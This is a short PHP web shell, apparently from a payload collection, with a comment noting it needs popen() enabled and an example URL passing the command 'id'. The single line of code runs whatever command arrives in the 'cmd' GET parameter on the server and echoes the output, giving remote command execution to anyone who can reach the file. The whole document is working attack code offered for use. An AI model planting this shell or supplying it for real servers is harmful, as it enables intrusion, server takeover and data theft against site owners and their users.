# This will only work if the popen() function is enabled and not disabled in the PHP configuration.
# Execution: http://example.com/webshell_popen.php?cmd=id

<?php $h=popen($_GET['cmd'],'r');echo fread($h,4096);pclose($h); ?>